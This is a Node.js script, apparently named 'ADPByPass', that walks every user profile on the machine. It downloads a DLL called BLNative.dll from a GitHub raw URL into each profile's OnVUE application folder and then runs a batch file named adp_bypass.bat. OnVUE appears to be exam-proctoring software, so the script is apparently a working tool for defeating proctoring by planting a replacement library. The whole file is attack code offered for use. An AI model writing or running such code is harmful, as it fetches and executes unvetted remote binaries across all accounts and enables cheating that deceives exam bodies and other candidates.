#!/usr/bin/env node
const fs = require('fs');
const path = require('path');
const https = require('https');
const http = require('http');
const { execFileSync } = require('child_process');

const batchPath = path.resolve(__dirname, 'adp_bypass.bat');
const downloadUrl = 'https://raw.githubusercontent.com/Dilip2003/ADPAgent/main/BLNative.dll';

function ensureDir(dirPath) {
    fs.mkdirSync(dirPath, { recursive: true });
}

function downloadFile(url, targetFile, log) {
    return new Promise((resolve, reject) => {
        const client = url.startsWith('https:') ? https : http;
        const req = client.get(url, (res) => {
            if (res.statusCode && res.statusCode >= 300 && res.statusCode < 400 && res.headers.location) {
                res.resume();
                resolve(downloadFile(res.headers.location, targetFile, log));
                return;
            }
            if (res.statusCode !== 200) {
                res.resume();
                reject(new Error(`Download failed with status ${res.statusCode}`));
                return;
            }
            ensureDir(path.dirname(targetFile));
            const file = fs.createWriteStream(targetFile);
            res.pipe(file);
            file.on('finish', () => file.close(() => resolve()));
            file.on('error', reject);
        });
        req.on('error', reject);
    });
}

async function runAdpBypass(options = {}) {
    const log = options.log || console.log;
    const downloadUrlToUse = options.downloadUrl || downloadUrl;
    const baseDirectories = options.baseDirectories || [];

    log(`ADPByPass invoked on ${process.platform}`);

    const targets = [];
    if (baseDirectories.length > 0) {
        for (const base of baseDirectories) {
            targets.push(path.join(base, 'AppData', 'Roaming', 'OnVUE'));
        }
    } else {
        const roots = [];
        if (process.platform === 'win32') {
            for (let drive = 'C'.charCodeAt(0); drive <= 'Z'.charCodeAt(0); drive++) {
                const driveLetter = String.fromCharCode(drive);
                const candidate = `${driveLetter}:\\Users`;
                if (fs.existsSync(candidate)) {
                    roots.push(candidate);
                }
            }
        } else {
            roots.push('/root');
            roots.push('/home');
        }

        for (const root of roots) {
            if (fs.existsSync(root)) {
                const entries = fs.readdirSync(root, { withFileTypes: true });
                for (const entry of entries) {
                    if (!entry.isDirectory()) continue;
                    const candidateDir = path.join(root, entry.name);
                    const onVueDir = path.join(candidateDir, 'AppData', 'Roaming', 'OnVUE');
                    targets.push(onVueDir);
                }
            }
        }
    }

    let wroteAny = false;
    for (const dirPath of targets) {
        ensureDir(dirPath);
        const targetFile = path.join(dirPath, 'BLNative.dll');
        try {
            await downloadFile(downloadUrlToUse, targetFile, log);
            log(`Downloaded BLNative.dll to ${targetFile}`);
            wroteAny = true;
        } catch (err) {
            log(`Failed to download to ${targetFile}: ${err.message}`);
        }
    }

    if (process.platform === 'win32' && fs.existsSync(batchPath)) {
        try {
            execFileSync('cmd.exe', ['/c', batchPath], { stdio: 'inherit' });
            log('ADPByPass batch file completed.');
        } catch (err) {
            log(`ADPByPass batch file failed: ${err.message}`);
        }
    }

    log('ADPByPass completed successfully.');
    return wroteAny;
}

if (require.main === module) {
    runAdpBypass().catch((err) => {
        console.error(err);
        process.exitCode = 1;
    });
}

module.exports = { runAdpBypass, downloadFile };
